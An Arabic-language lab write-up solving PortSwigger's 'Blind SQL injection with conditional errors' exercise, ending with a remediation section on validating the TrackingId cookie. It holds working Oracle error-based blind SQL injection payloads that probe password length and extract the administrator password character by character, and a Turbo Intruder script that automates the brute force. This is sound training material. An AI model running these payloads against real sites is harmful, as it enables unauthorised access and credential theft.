# [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

## **`الهدف`**
قم بتنفيذ هجوم `Blind SQLi` لمعرفة كلمة مرور حساب `administrator` ثم قم بتسجيل الدخول إليه.
## **`خطوات الحل`**
**`ملاحظة:`** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder` بالإضافة إلى استعمال أوامر استعلام بصيغة مختلفة.

سنقوم بتكرار نفس خطوات حل [اللاب السابق](./Blind-SQL-injection-with-conditional-responses.md) ولكن سنقوم باستعمال أمر استعلام مختلف لاختبار وجودة ثغرة `SQLi`
```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

**`ملاحظة جانبية:`** يمكن استعمال الاستعلامات التالية لتحديد الطول الدقيق لكلمة المرور قبل بدأ التخمين، ولكنها خطوة إختيارية إلى حد ما.
```sql
' AND (SELECT CASE WHEN (LENGTH(password) > 1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a

' AND (SELECT CASE WHEN (LENGTH(password) > 2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a

' AND (SELECT CASE WHEN (LENGTH(password) > 3) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a
```

ثم سنقوم بحقن أمر استعلام التالي في الـ `TrackingId` داخل `Inspector` لسحب كلمة مرور حساب `administrator`.
```sql
' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a
```

ثم سنقوم بتحويل الطلب إلى `Turbo Intruder` ونستعمل هذا السكريبت الذي يقوم بطباعة الطلبات التي تكون استجابتها `status code 500` فقط.
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=20,
                           pipeline=False)

    # Define characters to loop through
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    # Loop through positions and characters natively
    for position in range(1, 25):
        for char in chars:
            # Pass both variables directly to the engine to replace the placeholders
            engine.queue(target.req, [str(position), char])

	def handleResponse(req, interesting):
		if req.status == 500:
		    table.add(req)
```

ثم سنقوم بتجميع الحروف من الاستجابات بالترتيب حتى نحصل على كلمة المرور كاملة `x29a0nhnsnrtn9myof1c`، ثم نقوم بتسجيل الدخول إلى حساب `administrator` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)

ولكن بتعديل بسيط في النقطة الثانية من الترقيع حيث ستصبح:  
ويجب التحقق من مدخلات المستخدم ومطابقتها مع قائمة بيضاء محددة مسبقا قبل تمريرها إلى قاعدة البيانات، وبما أن قيمة الـ `TrackingId` داخل الـ `Cookie` تكون معروفة الهيكلة وتتكون فقط من حروف وأرقام `Alphanumeric` وبطول ثابت، فيجب ألا يتم قبول أي مدخل يخرج عن هذا النطاق مثل احتوائه على علامات اقتباس أو رموز خاصة أو بطول أكبر من المُحدد، ويقوم التطبيق برفض الطلب فوراً إذا كان المدخل غير صالح.
